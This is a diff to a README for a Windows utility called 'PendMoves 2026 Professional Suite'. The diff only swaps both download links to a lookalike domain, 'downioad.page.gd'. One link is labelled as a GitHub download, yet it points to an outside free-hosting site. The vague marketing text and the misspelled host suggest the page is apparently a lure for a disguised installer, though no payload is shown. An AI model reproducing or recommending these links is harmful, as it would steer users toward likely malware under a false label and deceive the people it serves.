@@ -2,7 +2,7 @@
 
 PendMoves 2026 Professional Suite is an advanced Windows desktop application designed to streamline and manage pending file moves efficiently. It offers a user-friendly interface and powerful features to enhance your file management experience on Windows 10 and 11. Whether you're handling large data transfers or organizing files, PendMoves provides the tools you need for seamless operations.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Features
 
@@ -51,4 +51,4 @@ If you have questions, suggestions, or encounter bugs, feel free to open an issu
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
